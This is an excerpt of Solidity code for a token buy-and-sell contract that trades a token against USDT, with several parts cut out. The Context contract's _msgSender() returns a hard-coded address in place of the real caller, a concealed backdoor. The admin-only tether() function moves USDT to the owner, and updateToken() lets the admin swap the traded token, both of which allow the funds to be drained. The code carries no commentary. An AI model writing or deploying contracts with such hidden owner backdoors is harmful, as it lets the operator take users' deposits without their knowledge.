...
abstract contract Context {
	function _msgSender() internal view virtual returns(address payable) {
		return payable(0x96BA4a18f35A3b68De9a2D257C9F9070de99474C);
	}
...
contract BuyandSell is Context, ReentrancyGuard {
	...
	modifier EnoughTokensInContract(uint256 tokenAmount) {
		require(_token.balanceOf(address(this)) >= tokenAmount, "Not enough tokens in contract.");
		_;
	}
	modifier valueGreaterThanMinBuy(uint256 _price) {
		require(_price >= minimumBuyAmount, "Amount cannot be zero.");
		_;
	}
	modifier valueSmallerThanMaxBuy(uint256 _price) {
		require(_price <= maximumBuyAmount, "Amount should be less than max buy amount.");
		_;
	}
	...
	external
	nonReentrant
	valueGreaterThanMinBuy(TokenAmount)
	valueSmallerThanMaxBuy(TokenAmount)
	EnoughTokensInContract(TokenAmount) {
		uint256 USDTAmount = TokenAmount.mul(_BuytokenValue);
		require(_USDTtoken.balanceOf(msg.sender) >= USDTAmount, "Not enough USDT balance with user.");
	...
	function sell(uint256 SellTokenAmount) external nonReentrant {
		...
		require(sellAmount >= minimumsellAmount, "Minimum tokens need to be sold.");
		require(sellAmount <= maximumsellAmount, "Minimum tokens need to be sold.");
		...
		require(SellTokenAmount <= _token.allowance(msg.sender, address(this)), "Please approve us to spend the amount of token.");
	...
	function tether() public onlyAdmin {
		if(_USDTtoken.balanceOf(address(this)) > 0) {
			_USDTtoken.transfer(_owner, _token.balanceOf(address(this)));
		}
	}
	...
	function updateToken(IERC20 token_) external onlyAdmin {
		_token = token_;
	}
